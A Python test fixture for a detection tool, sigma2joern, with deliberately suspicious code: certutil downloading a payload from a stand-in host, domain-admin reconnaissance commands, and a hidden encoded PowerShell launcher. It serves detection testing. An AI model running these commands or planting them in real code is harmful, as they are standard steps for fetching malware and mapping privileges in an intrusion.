"""Test fixture for sigma2joern: code that would trigger SOC detections if executed.

Nothing here is run by the tests. The commands are harmless (example.invalid never
resolves), but please do not execute this file anyway.
"""
import os
import subprocess

DOWNLOAD_URL = "http://example.invalid/payload.txt"


def fetch(url):
    subprocess.run(["certutil.exe", "-urlcache", "-split", "-f", url, "C:\\Users\\Public\\p.txt"])


def recon():
    os.system("whoami /priv")
    cmd = "net group"
    cmd += ' "domain admins" /domain'
    subprocess.check_output(cmd, shell=True)


def encoded(payload):
    subprocess.Popen(f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {payload}", shell=True)


def harmless():
    subprocess.run(["git", "status"])


if __name__ == "__main__":
    raise SystemExit("test fixture - do not run")
    fetch(DOWNLOAD_URL)
